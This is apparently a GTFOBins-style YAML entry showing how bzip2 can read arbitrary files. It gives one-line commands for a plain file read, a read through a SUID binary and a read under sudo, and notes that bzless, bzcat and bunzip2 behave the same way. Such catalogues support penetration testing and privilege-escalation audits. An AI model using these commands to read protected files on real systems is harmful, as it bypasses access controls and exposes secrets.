---
description: There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        bzip2 -c $LFILE | bzip2 -d
  suid:
    - code: |
        LFILE=file_to_read
        ./bzip2 -c $LFILE | bzip2 -d
  sudo:
    - code: |
        LFILE=file_to_read
        sudo bzip2 -c $LFILE | bzip2 -d
---
